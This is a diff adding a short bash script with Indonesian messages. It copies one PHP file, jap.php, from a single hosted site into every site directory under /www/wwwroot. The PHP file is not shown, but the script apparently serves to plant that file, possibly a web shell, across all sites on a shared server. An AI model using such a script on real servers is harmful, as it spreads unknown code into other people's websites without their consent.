@@ -1,0 +1,18 @@
+#!/bin/bash
+
+
+php_file="/www/wwwroot/tekno.topikbisnis.com/jap.php"
+
+
+root_dir="/www/wwwroot"
+
+for dir in "$root_dir"/*; do
+
+    if [ -d "$dir" ]; then
+  
+        cp "$php_file" "$dir"
+        echo "File PHP berhasil di-upload ke $dir"
+    fi
+done
+
+echo "Semua file PHP telah berhasil di-upload."
